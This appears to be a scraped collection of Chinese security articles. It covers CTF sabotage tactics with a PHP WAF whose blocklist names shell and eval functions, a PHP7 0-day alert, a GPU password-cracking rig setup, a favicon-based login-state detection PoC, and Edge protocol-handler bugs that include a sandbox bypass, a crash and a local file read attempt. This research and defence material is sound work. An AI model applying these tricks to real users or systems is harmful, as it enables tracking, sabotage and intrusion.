}?&gt;遍曆目录，得到所有的php文件，然后至于你想改写内容还是直接删掉，看心情了。遍曆目录的方法很多，但是大多数这些函数都被禁用了（disable_functions）。偶尔有个别漏网之鱼，比如glob~~这个函数比较少见吧。所以这样就用了它。如果删除函数unlink被ban掉就改写咯0×05 搅屎之WAF感觉这个杀器有点邪恶。对于线下赛来说，近乎于无敌，反正我自己没有什麽好的方法破解。噁心人啊。php_waf_and_log_to_txt.php&lt;?php    error_reporting(0);    define('LOG_FILENAME','log.txt');    function waf()    {        if (!function_exists('getallheaders')) {            function getallheaders() {                foreach ($_SERVER as $name =&gt; $value) {                    if (substr($name, 0, 5) == 'HTTP_')                        $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;                }                return $headers;            }        }        $get = $_GET;        $post = $_POST;        $cookie = $_COOKIE;        $header = getallheaders();        $files = $_FILES;        $ip = $_SERVER[""REMOTE_ADDR""];        $method = $_SERVER['REQUEST_METHOD'];        $filepath = $_SERVER[""SCRIPT_NAME""];        //rewirte shell which uploaded by others, you can do more        foreach ($_FILES as $key =&gt; $value) {            $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']);            file_put_contents($_FILES[$key]['tmp_name'], ""virink"");        }        unset($header['Accept']);//fix a bug        $input = array(""Get""=&gt;$get, ""Post""=&gt;$post, ""Cookie""=&gt;$cookie, ""File""=&gt;$files, ""Header""=&gt;$header);        //deal with        $pattern = ""select|insert|update|delete|and|or|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex"";        $pattern .= ""|file_put_contents|fwrite|curl|system|eval|assert"";        $pattern .=""|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"";        $pattern .=""|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec"";        $vpattern = explode(""|"",$pattern);        $bool = false;        foreach ($input as $k =&gt; $v) {            foreach($vpattern as $value){                foreach ($v as $kk =&gt; $vv) {                    if (preg_match( ""/$value/i"", $vv )){                        $bool = true;                        logging($input);                        break;                    }                }                if($bool) break;            }            if($bool) break;        }    }    function logging($var){        file_put_contents(LOG_FILENAME, ""\r\n"".time().""\r\n"".print_r($var, true), FILE_APPEND);        // die() or unset($_GET) or unset($_POST) or unset($_COOKIE);    }    waf();?&gt;这个WAF在线下攻防赛中，绝对是一个大杀器。不仅拦截了大多数非法语句，还能记录所有的攻击流量，轻松得到别人的payload。不知道主办方要如何解决这个WAF所存在的问题。当然，这个WAF应该也不是完美的，还可以添加更多的规则，让他变得更强！接下来再说说，在实战中如何加载这个WAF。根据权限不同，就有不同的加载方式。有root权限那麽，这样就简单了，直接写在配置中。vim php.iniauto_append_file = “/dir/path/phpwaf.php”重启Apache或者php-fpm就能生效了。当然也可以写在 .user.ini 或者 .htaccess 中。php_value auto_prepend_file “/dir/path/phpwaf.php”只有user权限没写系统权限就只能在代码上面下手了，也就是文件包含。这钟情况又可以用不同的方式包含。如果是框架型应用，那麽就可以添加在入口文件，例如index.php，如果不是框架应用，那麽可以在公共配置文件config.php等相关文件中包含。include('phpwaf.php');还有一种是替换index.php，也就是讲index.php改名为index2.php，然后讲phpwaf.php改成index.php。当然还没完，还要在原phpwaf.php中包含原来的index.php。index.php -&gt; index2.phpphpwaf.php -&gt; index.phpinclude('index2.php');至于你想用哪种方式，看你心情咯，你开心就好。0×06 结束语写这篇文章的目的并不是让大家都去CTF搅屎，毕竟CTF是一个正规的比赛的地方，有助于我们学习更多的技术以及黑科技。当然，服务器维护人员也是很辛苦的。我们暴打出题人就好了，何必为难运维。（出题人就是运维的情况下，例外！！！）希望大家用正确的心态看这篇文章，“PHP是世界上最好的语言”，能够挖掘的地方还有很多。主办方，表打我欸。","2016-10-31 15:22:05","CTF专题","论如何在CTF比赛中搅“shi”","http://nsoad.com/Article/CTF/20161031/671.html"
"5ccbfa074f2f0a0a7a69bffd","Check Point的安全研究员在PHP7上发现了3个严重0day漏洞，并且其中还有一个0day未被修复。","Blackhold","Check Point的安全研究员在PHP7上发现了3个严重0day漏洞，并且其中还有一个0day未被修复。如果这些漏洞被攻击者成功利用后果非常严重，可导致全球80%的网站被攻击者完全控制。PHP简介PHP是一种通用开源脚本预言，吸收了C预言、Java和Perl的特点，更容易被开发者学习使用。用PHP做出的动态页面与其他的编程语言相比，PHP是将程序嵌入到HTML（标准通用标记语言下的一个应用）文档中去执行，执行效率比完全生成HTML标记的CGI要高许多；PHP还可以执行编译后代码，编译可以达到加密和优化代码运行，使代码运行更快的效果。PHP7是最新的PHP版本，相比较于先前的一些版本，PHP7进行了更多的优化，比如移除了一些冗杂的特性：1.移除一些旧的扩展，被移迁移到了PECL（例如：mysql） 2.移除SAPIs的支持 3.&lt;?和&lt;? language=“php”这样的标签被移除了 4.16进制的字符串转换被废除了5.HTTP_RAW_POST_DATA移除了（可以使用php://input替代） 6.静态函数里面不再支持通过一个不兼容的$this调用一个非静态的函数了 $o = &amp; new className{}，不再支持这样的写法 7.php.ini文件移除了#作为注释，统一用;去注释增加了一些新的功能特性：1.性能改善： PHP 7 高达两倍快的 PHP 5.62.显著减少内存使用3.抽象语法树4.一致的 64 位支持5.改进的异常层次结构6.许多转化为异常致命错误7.安全随机数发生器8.删除旧的和不支持的 SAPIs 和扩展9.空合并运算符（？）10.返回和标量类型声明11.匿名类12.零成本断言PHP7中的3个0day还未完全修复然而不幸的是，如此好用的PHP竟然存在3个非常严重的漏洞。Check Point的安全研究员通过数月的研究，在PHP7反序列化机制中发现了3个从未被曝光的漏洞。其实在PHP5的反序列化机制中也被发现过安全漏洞，可允许攻击者入侵Drupal、Joomla、Magento、vBulletin、PornHub网站。如今PHP7中被发现的安全漏洞和PHP5中的漏洞是不一样的，漏洞编号如下：CVE-2016-7479CVE-2016-7480CVE-2016-7478如果前两个漏洞被成功利用，攻击者可获得目标服务器的最高权限，进而可以执行一系列的恶意操作，比如散播恶意软件、窃取用户数据、涂鸦网站等。CVE-2016-7478是一个拒绝服务漏洞攻击，攻击者可一直对目标网站发动拒绝服务攻击，耗尽其内存，从而导致系统宕机。Check Point在发现这些漏洞之后，已经提交给了PHP安全团队，目前已经修复两个，一个未修复。不幸中的幸运，Check Point的安全研究员Yannay Livneh称，目前还没有发现这三个漏洞被恶意利用。以防万一，在漏洞被恶意人员利用之前，建议用户尽快将自己的服务器更新到最新版的PHP，至于那个还未被修复的0day，暂时只能各展所长进行自我防护了。","2016-12-30","漏洞发布","【漏洞预警】PHP7被发现三个0day漏洞，其中一个还未修复","http://nsoad.com/Article/exploit/20161230/vulzone-46.html"
"5ccbfa084f2f0a0a7a69bffe","这台密码破解机既不需要任何的“黑魔法”，也不需要你花大量时间和精力去组装各种乱七八糟的零配件。","Alpha_h4ck","长话短说这台密码破解机既不需要任何的“黑魔法”，也不需要你花大量时间和精力去组装各种乱七八糟的零配件。如果你按照这篇文章给出的方法来进行设备组装的话，你应该可以在三个小时之内搭建出一台密码破解工作站。各位同学不用担心，这台机器的搭建方法非常简单，只要你按照步骤一步一步操作就肯定不会出错。我们的目标我们目前的工作站配备了六块GTX970S，我们现在的目标是将其升级为八块GTX1080，而且还要保证工作站能够稳定运行。组件清单硬件1. 机箱支架&amp;主板-Tyan Ft77C-B7079（P/N:B7079F77CV10HR-N）2. CPU：两块Xeon E5-2620V3 LGA2011（不要只买一块CPU，因为我们需要两块CPU来管理和控制所有的PCIE插槽）3. 内存：两根32g DDR4 2400MHz LRDIMM内存条4. 硬盘：三星SSD 850 EVO 固态硬盘，容量1T5. GPU：八块EVGA gtx1080 FE显卡（也就是我们所说的公版卡）软件1. Ubuntu-14.04.3 64位服务器版本；2. hashcat-www.hashcat.net；3. hashview-www.hashview.io；组装现在想要搭建出一台中高端的密码破解机实际上就跟玩乐高积木一样，尽管这是一种非常昂贵的“乐高积木”。我们专门录制了一个加速版的搭建视频，在真正开始动手之前，大家可以先观看一下这个视频来对整个搭建过程有个大致的了解。组装笔记我们在购买和组装所有零配件的过程中也学到了很多新的东西，经过整理之后的注意事项大致有如下几点：1.    你不需要为CPU单独购买散热器或散热风扇，Tyan机箱已经自带这些设备了；2.    Tyan机箱为你的GPU提供了专门的螺丝固定位置；3.    这款主板似乎没有硬件RAID；4.    主板BIOS无需进行任何修改和更新，主板已经默认更新至了2017年1月份的版本；5.    我们禁用了系统扬声器，因为如果你没有把所有的供电插头都插上的话，它就会不停地发出警报声；大家可以从下图中看到，显卡的后方提供了额外的螺丝固定位，如果你需要搬运这台工作站的话，你最好将这些螺丝都固定好。需要提醒大家的是，这家伙真的是太沉了！    软件安装大家应该在硬件的安装方面不会遇到太大的麻烦，我们只需要先插入一块显卡，启动系统，然后在确定了设备运行一切正常之后我们就可以开始安装操作系统了。Ubuntu安装完成之后，我们稍后便可安装剩下的显卡了。一般情况下，这样的操作都不会出现任何问题，所以也许下一次我们可以试试一次性插好所有的显卡然后启动设备，其实这样也不会有什么问题。安装Ubuntu 14.04.3 64位服务器版在这里我就不打算详细介绍如何安装系统了，网上也有很多相关的资料，但是这里有几点需要我们注意的：1.  使用LVM；2.  不用对整个磁盘或home目录加密，我们之后可以自己创建一个加密卷；3.  在选择安装的软件时，勾选“OpenSSH Server”；操作系统安装完成之后，让系统搜索所有可用的GPU：lspci | grep VGA更新驱动程序并安装hashcat以及相应的依赖环境：sudo apt-get update &amp;&amp; apt-get upgradesudo apt-get install gcc make p7zip-full git lsb-core下载并安装Nvidia驱动程序和Intel OpenCL运行环境下载nvidia驱动程序。目前该显卡的驱动程序版本为Nvidia375.26（2017年1月份）。wget http://us.download.nvidia.com/XFree86/Linux-x86_64/375.26/NVIDIA-Linux-x86_64-375.26.runchmod +x NVIDIA-Linux-x86_64-375.26.runsudo ./NVIDIA-Linux-x86_64-375.26.run如果系统弹出的警告信息是有关x86兼容性问题的话，你可以直接忽略它。下面给出的是你可能会遇到的警告信息：WARNING: Unable to find a suitable destination to install32-bit compatibility libraries. Your system may not be set up for 32-bitcompatibility. 32-bit compatibility files will not be installed; if you wish[Cto install them, re-run the installation and set a validdirectory with the --compat32-libdir option安装OpenCL运行环境（虽不是必须组件，但我们建议安装，因为CPU放着不用也是浪费）wget http://registrationcenter-download.intel.com/akdlm/irc_nas/9019/opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgztar -xvf opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgzcd opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25./install.sh安装hashcat【官网地址】wget https://hashcat.net/files/hashcat-3.30.7z7z x hashcat-3.30.7zcd hashcat-3.30安装完成之后，使用基准程序来测试hashcat，速度为341GH/s！安装hashview【官网地址】安装依赖环境sudo apt-get updatesudo apt-get install mysql-server libmysqlclient-devredis-server opensslmysql_secure_installation优化数据库设置vim /etc/mysql/my.conf将下面这行内容添加到【mysqld】的下方区域：innodb_flush_log_at_trx_commit  = 0重启Mysqlservice mysql restart安装RVM-（下方给出的命令来源于https://rvm.io/rvm/install）gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3\curl -sSL https://get.rvm.io | bash -s stable –ruby下载并安装Hashviewgit clone https://github.com/hashview/hashviewcd hashview安装gem包rvm install ruby-2.2.2gem install bundlerbundle install设置数据库链接cp config/database.yml.example config/database.ymlvim config/database.yml创建数据库RACK_ENV=production rake db:setup另外打开一个新的终端，运行下列命令：RACK_ENV=production TERM_CHILD=1 QUEUE=* rake resque:work运行HashviewRACK_ENV=production ruby hashview.rb破解哈希安装完成之后，我们可以开始动手破解密码哈希了。接下来我们就可以泡一杯咖啡，然后一边喝咖啡一边看着系统给出的实时分析结果。","2017-02-28 15:45:25","安全工具","手把手教你构建8个GPU的破密码机","http://nsoad.com/Security-tools/20170228/tools-1089.html"
"5ccbfa084f2f0a0a7a69bfff","我要告诉大家的是，在没有得到你同意的情况下，目前大多数主流的网络平台都会泄漏你的登录状态。无论你当前是否进行了登录操作，攻击者都可以检测到你电脑登录了那些网络平台。","Kong","前言我要告诉大家的是，在没有得到你同意的情况下，目前大多数主流的网络平台都会泄漏你的登录状态。无论你当前是否进行了登录操作，攻击者都可以检测到你电脑登录了那些网络平台。而且目前有很多平台可以提供人口统计以及个性分析之类的服务，所以攻击者也可以就此推测出你的人物特性。演示站点：【点我访问】技术分析对于绝大多数的平台而言，它们都可以利用登录机制来检测用户是否登录了自己的网络服务。虽然这个漏洞已经存在多年了，而且这也是一个众所周知的漏洞，但是目前大多数公司似乎并不打算去修复它。需要注意的是，这个漏洞的利用方法非常简单，而且修复这个漏洞也十分容易。接下来，我会以facebook.com为例子来给大家介绍这项技术的工作原理。登录重定向机制是如何工作的？首先，我们要了解什么是登录重定向机制。假设你已经登录并正在访问https://www.facebook.com/bookmarks/pages这个页面。现在，在一个单独的网页标签中访问这个URL地址，此时你在这个网页标签中并没有进行登录操作，因此你会被下面这个URL地址重定向至网站服务的登录页面：https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Fbookmarks%2Fpages请注意上述URL地址中的next参数，该参数的值如下：https%3A%2F%2Fwww.facebook.com%2Fbookmarks%2Fpages我们就是从该参数中的这个地址跳转过来的，当我们完成了登录操作之后，上面的这个URL会将我们重定向至之前我们所要访问的那个页面。如果我们现在已经登录了，那么在一个新的浏览器页面标签下访问这个URL地址（https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Fbookmarks%2Fpages），那么浏览器会直接将我们定向至这个页面。所以我们可以得出结论：1.  如果你已经登录了：URL将返回next参数中的地址；2.  如果你没有登录：URL将返回网站服务的登录页面；绕过同源策略这个URL地址有什么用呢？同源策略可以防止我们从除了https://facebook.com之外的其他域读取这个请求所返回的结果。同源策略对于HTML页面来说是非常严格的，但是它允许我们从其他域接收图片资源。所以，如果next参数中的资源是图片资源的话，我们就可以从自己的网站来读取这部分数据了。Facebook只会检测URL地址中next参数的值是否以https://facebook.com开头，所以我们只需要在Facebook的网站中找一张图片文件就可以了。这应该没什么困难吧？其实，这确实有点难！因为Facebook网站中的图片全部托管在域名fbcdn.net。但是还有一张图片几乎是所有Web服务器中都会有的，那就是favicon.ico！下面给出的就是将网站图标作为next参数时的URL地址：https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico这是一个非常有意思的URL地址：1.  如果你已经登录了：URL将返回网站图标；2.  如果你没有登录：URL将返回网站服务的登录页面；我们可以在自己网站中的某个&lt;img&gt;标签内使用这个URL地址：&lt;imgsrc=""https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico""&gt;这个&lt;img&gt;标签的属性如下：1.  如果你已经登录了：你将会接收到网站图标，HTML页面会自动加载这个图片资源，并自动触发onLoad回调事件；2.  如果你没有登录：你将会接收到网站的登录页面，图标资源会加载失败，并自动触发onError回调事件；最终的漏洞利用代码如下所示：&lt;img onload=""alert('logged in to fb')""onerror=""alert('not logged in to fb')""src=""https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico""&gt;其他平台这项技术适用于目前绝大多数主流的网络平台，因为很多服务提供商在他们的登录地址中都添加了重定向参数，而且他们也需要在主机中托管网站的图标资源。更新信息2016/10/07:Instagram移除了网站根目录下的图标文件，并将其转移至了他们的CDN中。2016/10/14:Stackoverflow已经修复了这个问题。2016/10/14:火狐浏览器似乎也修复了这个问题。因为当我们使用新版火狐浏览器访问测试页面时，我们接收到了如下图所示的错误信息：2016/10/14:Netflix通过将页面重定向至网站主页面以修复这个问题。这项技术的可利用性和缓解方案攻击者还可以在去匿名化技术、点击劫持攻击和网络钓鱼攻击中使用这项技术。这样一来，将会给用户带来更大的损失。因此，为了缓解这个问题所带来的影响，首先就是要禁用所有的第三方cookie。除此之外，你也可以安装类似Privacy Badger和uMatrix这样的浏览器插件来保护你免受此类攻击。总结如果你发现还有其他的网站有可能受到这种攻击技术的影响，请你赶快将它们公布出来。我们要向这些平台施加压力，如果这个问题越来越严重，而且越来越多的网站会受此影响的话，也许有一天他们会去修复这个问题的。","2016-11-24 13:35:27","Web安全","一个网站图标引发的血案！绕过同源策略，判断你是否登录了某网站","http://nsoad.com/Article/web/20161124/843.html"
"5ccbfa084f2f0a0a7a69c000","在 10 月 25 日，研究员 @MSEdgeDev twitter 了一个链接，成功引起了我的注意，因为我点击那个链接的时候（在 Chrome 上），Windows 应用商店会自动打开。这对你来说也许不足为奇，但它足以让我感到惊讶。","kong","在 10 月 25 日，研究员 @MSEdgeDev twitter 了一个链接，成功引起了我的注意，因为我点击那个链接的时候（在 Chrome 上），Windows 应用商店会自动打开。这对你来说也许不足为奇，但它足以让我感到惊讶。在我的印象中，Chrome 有这样一个健康的习惯，在打开外部程序之前询问用户是否打开外部程序。但是这次的情况是它直接打开了相应程序，而且没有弹出警告。这次的差别情况反应引起了我的注意，因为我从来没有允许 Chrome 打开 Windows 商店。有一些插件和协议会自动打开，但我从来没有允许过 Windows 商店这一应用。Twitter 的短链接重定向至 https://aka.ms/extensions-storecollection ，然后再一次重定向到：ms-windows-store://collection/?CollectionId=edgeExtensions ，Interesting ~.关于这一协议我不甚了解，因此我马上试着找到与该协议存在多处关联的地方：注册表。搜索 “ms-windows-store” 立即返回了我们在 PackageId 中的字符串，这似乎是 Windows 应用商店的程序。注意我们也在一个名为 “Windows.Protocol” 的键之中，我稍微上下滚动了一些，以便看看有没有其他的应用程序在其中。然后我发现他们很多拥有自己的注册协议。这便是极好的，因为这直接从浏览器打开了一个新的攻击面。然后我们按 F3 看看是否找到了其他的匹配项。似乎 ms-windows-store：协议也接受搜索参数，所以我们可以试着直接从 Google Chrome 打开我们的自定义搜索。事实上，Windows 应用商店应用程序好像使用了 Edge 的引擎渲染 HTML，这也是很有趣的地方，因为我们可能尝试进行 XSS 攻击，亦或是针对本地程序，发送一大堆数据然后看看会发生什么。但是现在我们不会这么干，我们回到注册表上来，按下 F3 看看能找到什么。这也是很有意思的，因为如果它们用字符串 “URL:”前缀的话，它会给我们快速找到更多的协议的线索。让我们将搜索重置为 “URL:”，看看我们得到什么。按下 [HOME] 键回到注册表的顶部，搜索 “URL:” ，将马上返回第一个匹配的 “URL：about:blank”，以及各位顺便确认下我们有没有疯掉。再次按下 F3 ，我们找到了 bingnews: 协议，但是这次 Chrome 向我们确认了是否要打开它。没毛病，让我们在 Edge 上试试看会发生什么。它打开了！在注册表中下一个匹配的的是 calculator: 协议。这会生效吗？Wow！exploit 的作者们肯定好气啊。它们将弹出什么程序呢？calc 和 notepad 可以打开，而且没有产生内存损坏。现在 cmd.exe 已经弃用，而是采用了 powershell。微软移除了你们这群人的乐趣 😛 。这便是枚举所有可能被加载的协议的时候了，先去看看哪些程序接受参数，那么我们可以尝试注入代码（二进制或者纯 Javascript，取决于应用程序的编码方式和他如何处理参数）。有很多有趣的玩法，如果我们继续寻找协议，我们将发现大量的能打开的程序（包括 Candy Crush，我还不知道我电脑上有这东西）。通过按几次 F3 ，我受益匪浅。例如，有一个 microsoft-edge:协议在新标签中加载 URL。这看起来似乎并不重要，直到我们记住 HTML 页面应有的限制。弹出窗口拦截器会阻止我们打开 20 个 microsoft-edge:http://www.google.com 标签吗？[ PoC – 在微软 Edge 浏览器上弹窗 ]那么 HTML5 沙箱又怎样呢？如果你不熟悉它，它只是一种使用 iframe 沙箱属性或者 http header 的沙箱属性对网页施加限制的方法。例如，如果我们想在 iframe 中渲染内容并且确保它不运行 javascript （甚至不打开新标签），我们只需要使用此标签： 然后渲染的页面将被完全限制。它基本上只能渲染 HTML/CSS ，但是没有 javascript 或者其他访问接触到像 cookie 这样的东西。事实上，如果我们使用沙盒粒度，并且至少允许打开新窗口/标签，他们应该全都继承沙箱属性，以及从 iframe 点击链接打开的依然受沙盒限制。然而，使用 microsoft-edge 协议完全绕过了这一点。[ PoC – 在 微软 Edge 浏览器上绕过 HTML5 沙箱 ]很高兴看到 microsoft-edge 协议允许我们绕过不同的限制。我更深入研究，但你可以一试！这是一次发现之旅，纪念这一条 tweet 激发了我研究的动力，而且最终给我们真正值得进行更多研究的材料。我继续在注册表中按下 F3 键，发现了 read: 协议，它引起了我的注意力，因为当阅读它的 （javascript）源码时，它可能有潜在的 UXSS 漏洞，但是尝试的过程中 Edge 一次次地崩溃了。它崩溃太多次了。例如，将 iframe 的 location 设置为 “read:” 就足以使浏览器崩溃，包括所有选项卡。想看看吗？[ PoC – Crash on MS Edge ]OK，我很好奇发生了什么，所以我附加了几个字节到 read 协议，并启动了 WinDbg 看看崩溃是不是和无效数据有关。这些东西迅速且简单，没有 fuzzing 或任何特殊的东西：read:xncbmx,qwieiwqeiu;asjdiw!@#$%^&amp;*。Oh yes，我真的打出来了这些东西。我发现的不会使 read 协议崩溃的唯一方法就是加载来自 http[s]的东西。其他的方法都会使浏览器崩溃。那么让我们将 WinDbg 附加至 Edge 浏览器吧。有一个快速的脏方法，我使用它来简单地杀死 Edge 进程和子进程，重新打开它并附加到使用 EdgeHtml.dll 的最新进程。当然还有更简单的方法，但是...yeah，我就是这么做的。打开命令行，然后...taskkill /f /t /im MicrosoftEdge.exe** Open Edge and load the webpage but make sure it doesn't crash yet **tasklist /m EdgeHtml.dll  够了。现在加载 WinDbg ，并将其附加到使用 EdgeHtml 的，最新列出的 Edge 进程。记住在 WinDbg 中使用的符号。一旦附加上去，只需要按 F5 或者在 WinDbg 中按 g [回车]，使 Edge 保持运行。这是我屏幕现在看起来的样子。左边有我用来测试一切的页面，在右边， WinDbg 附加到特定的 Edge 进程。我们将使用 window.open 伴以 read: 协议继续玩耍，而不是一个 iframe ，因为它使用起来更舒服。仔细想想，有的协议/url 可能会最终改变顶部 location，无论它们如何使用框架。如果我们开始在 iframe 中使用协议，有可能我们自己的页面（顶部）将被卸载，失去我们刚刚键入的代码。我特定的测试页面保存了我键入的内容，如果浏览器崩溃，它很可能被恢复。但即使一切都保存下来了，当我编写一些可以改变我测试页面的 URL 的代码时，我就在一个新窗口中打开它。这只是一种习惯罢了。在左侧屏幕上，我们可以快速键入并执行 JavaScript 代码，右侧有 WinDbg 准备向我们解释在崩溃的背后到底发生了什么。我们继续，运行 JavaScript 代码以及... Bang! WinDbg 中断了连接。ModLoad: ce960000 ce996000 C:\Windows\SYSTEM32\XmlLite.dll  ModLoad: c4110000 c4161000 C:\Windows\System32\OneCoreCommonProxyStub.dll  ModLoad: d6a20000 d6ab8000 C:\Windows\SYSTEM32\sxs.dll(2c90.33f0): Security check failure or stack buffer overrun - code c0000409 (!!! second chance !!!)EdgeContent!wil::details::ReportFailure+0x120:  84347de0 cd29 int 29hOK，看来 Edge 知道出了问题因为它位于一个叫做 “ReportFailure” 的函数中，对吧？得了，我知道我们马上可以猜测，如果 Edge 在此，它会有失“优雅”。所以我们检查 stack trace 来看看我们来自何方。在 WinDbg 中输入 “k” 键。0:030&gt; k  # Child-SP RetAddr Call Site00 af248b30 88087f80 EdgeContent!wil::details::ReportFailure+0x120  01 af24a070 880659a5 EdgeContent!wil::details::ReportFailure_Hr+0x44  02 af24a0d0 8810695c EdgeContent!wil::details::in1diag3::FailFast_Hr+0x29  03 af24a120 88101bcb EdgeContent!CReadingModeViewerEdge::_LoadRMHTML+0x7c  04 af24a170 880da669 EdgeContent!CReadingModeViewer::Load+0x6b  05 af24a1b0 880da5ab EdgeContent!CBrowserTab::_ReadingModeViewerLoadViaPersistMoniker+0x85  06 af24a200 880da882 EdgeContent!CBrowserTab::_ReadingModeViewerLoad+0x3f  07 af24a240 880da278 EdgeContent!CBrowserTab::_ShowReadingModeViewer+0xb2  08 af24a280 88079a9e EdgeContent!CBrowserTab::_EnterReadingMode+0x224  09 af24a320 d9e4b1d9 EdgeContent!BrowserTelemetry::Instance::2::dynamic  0a af24a3c0 8810053e shlwapi!IUnknown_Exec+0x79  0b af24a440 880fee33 EdgeContent!CReadingModeController::_NavigateToUrl+0x52  0c af24a4a0 88074f98 EdgeContent!CReadingModeController::Open+0x1d3  0d af24a500 b07df508 EdgeContent!BrowserTelemetry::Instance'::2::dynamic  0e af24a5d0 b0768c47 edgehtml!FireEvent_BeforeNavigate+0x118  看看前两行，都叫做 blah blah ReportFailure ，你不觉得 Edge 运行到这里是因为出现错误了吗？当然！让我们继续运行下去，直到我们找到一个有意义的函数名。下一个叫做 blah FallFast，它也有一些 Edge 知道出错了才调用的味道。但是我们想找到使 Edge 不愉悦的代码，那么继续读下去吧。下一个是 blah _loadRMHTML。这个对我来说看起来好多了，你难道不也这么认为吗？事实上，他的名字让我觉得它是加载 HTML 的。在崩溃之前断下程序的话，这将会变得有意思多了，所以为什么不在 _LoadRMHTML 上面几行设置断点呢？我们检查了 stack-trace，现在我们来看看代码。我们先从那个断点（函数+偏移）查看反汇编。这很简单，在 WinDbg 中使用 “ub” 命令。0:030&gt; ub EdgeContent!CReadingModeViewerEdge::_LoadRMHTML+0x7c  EdgeContent!CReadingModeViewerEdge::_LoadRMHTML+0x5a:  8810693a call qword ptr [EdgeContent!_imp_SHCreateStreamOnFileEx (882562a8)]  88106940 test eax,eax  88106942 jns EdgeContent!CReadingModeViewerEdge::_LoadRMHTML+0x7d (8810695d)  88106944 mov rcx,qword ptr [rbp+18h]  88106948 lea r8,[EdgeContent!`string (88261320)]  8810694f mov r9d,eax  88106952 mov edx,1Fh  88106957 call EdgeContent!wil::details::in1diag3::FailFast_Hr (8806597c)我们只关注名字，忽略其他东西，好伐？就像我们试着寻找 mimeType bug 的变动一样，我们在此投机取巧，当然如果我们失败了就继续深入。但有时在调试器上的快速查看可以阐明很多事情。我们知道如果 Edge 到达这个片段的最后一条指令（地址为 88106957，FailFast_Hr），Edge 就会崩溃掉。我们的目标是弄清我们最终到达的地方，就是说谁TM把我带到那里的。上面的代码的第一条指令似乎是调用了一个复杂名称的函数，这显然大量体现了我们的东西。EdgeContent!_imp_SHCreateStreamOnFileEx在 ! 前的第一部分是该指令所在的模块（exe，dll等等...)。这种情况下是 EdgeContent 我们甚至不关心它的扩展，它只是一段代码。! 之后有个有趣的函数名叫_imp_ ，然后 SHCreateStreamOnFileEx 似乎是一个“创建文件流”的函数名。你同意吗？事实上，_imp_的部分让我想起这可能是从不同的二进制文件加载的导入函数。让我 google 一下这个名字，看看能不能找到有趣的东西。这太棒了。第一个结果正是我们搜索的准确名称。让我们点击一下。好。此函数接收的第一个参数是 “A pointer to a null-terminated string that specifies the file name” 。因垂丝挺！如果这段代码正被执行，那么它应该接收一个指向文件名的指针作为第一个参数。但是我们这么能看到第一个参数呢？很简单，我们在 Win x64上运行，调用约定/参数解析说，“前四个参数是 RCX, RDX, R8, R9 ”（表示整数/指针）。这意味着第一个参数（指向文件名的指针）将被装载入 RCX 寄存器。有了这些信息，我们可以在 Edge 调用之前设置一个断点，看看 RCX 在那个确定时刻有何值。但是我们重新启动一遍程序吧，因为这时已经有点迟了：Edge 已经崩溃了。请重新按照上面描述的做一遍（杀掉 Edge 进程，打开它，加载页面，找到进程并附加上去）。这个时候，不要运行（F5）进程，我们先设置一个断点。WinDbg 显示了我们执行 “ub” 命令时的确切偏移量。0:030&gt; ub EdgeContent!CReadingModeViewerEdge::_LoadRMHTML+0x7c  EdgeContent!CReadingModeViewerEdge::_LoadRMHTML+0x5a:  8810693a ff1568f91400 call qword ptr [EdgeContent!_imp_SHCreateStreamOnFileEx (882562a8)]  88106940 85c0 test eax,eax  所以断点应该在 EdgeContent！CReadingModeViewerEdge :: _ LoadRMHTML 0x5a 处。我们键入 “bp” 和函数名 + 偏移[回车]。然后 “g” 让 Edge 运行。0:029&gt; bp EdgeContent!CReadingModeViewerEdge::_LoadRMHTML+0x5a  0:029&gt; g  这很一颗赛艇。在 SHCreateStreamOnFileEx 执行之前，我们想要看到 RCX 指向的文件名（或者字符串）。我们运行代码，稍适小憩。好吧，宝宝我感受到它了 =) 断点连至我的童年。让我们运行这段 JavaScript 代码吧，bang！WinDbg 在此中断。Breakpoint 0 hit  EdgeContent!CReadingModeViewerEdge::_LoadRMHTML+0x5a:  8820693a ff1568f91400 call qword ptr [EdgeContent!_imp_SHCreateStreamOnFileEx (883562a8)]这太棒了，现在我们可以检查 RCX 指向的内容。为此我们使用 “d” 命令（显示内存）@ 和寄存器名称，如下所示：0:030&gt; d @rcx  02fac908 71 00 77 00 69 00 65 00-69 00 77 00 71 00 65 00 q.w.i.e.i.w.q.e.  02fac918 69 00 75 00 3b 00 61 00-73 00 6a 00 64 00 69 00 i.u.;.a.s.j.d.i.  02fac928 77 00 21 00 40 00 23 00-24 00 25 00 5e 00 26 00 w.!.@.#.$.%.^.&amp;.  02fac938 2a 00 00 00 00 00 08 00-60 9e f8 02 db 01 00 00 *.......`.......  02fac948 10 a9 70 02 db 01 00 00-01 00 00 00 00 00 00 00 ..p.............  02fac958 05 00 00 00 00 00 00 00-00 00 00 00 19 6c 01 00 .............l..  02fac968 44 14 00 37 62 de 77 46-9d 68 27 f3 e0 92 00 00 D..7b.wF.h'.....  02fac978 00 00 00 00 00 00 08 00-00 00 00 00 00 00 00 00 ................  这对我的眼睛很不好，但在第一行的右边，我看到了一些类似于 Unicode 字符串的东西。我们将它显示为Unicode字符吧（du 命令）。0:030&gt; du @rcx  02fac908 ""qwieiwqeiu;asjdiw!@#$%^&amp;*""  Nice!字符串将我包围！看看我们刚才运行的 JavaScript 代码。看来，传给这个函数的参数是逗号后面输入的任何内容。有了这点知识加上知道它期望是一个文件，我们可以尝试一个在硬盘上的完整的路径。因为 Edge 在 AppContainer 内部运行，我们将尝试一个可访问的文件。例如来自 windows/system32 目录的内容。read:,c:\windows\system32\drivers\etc\hosts  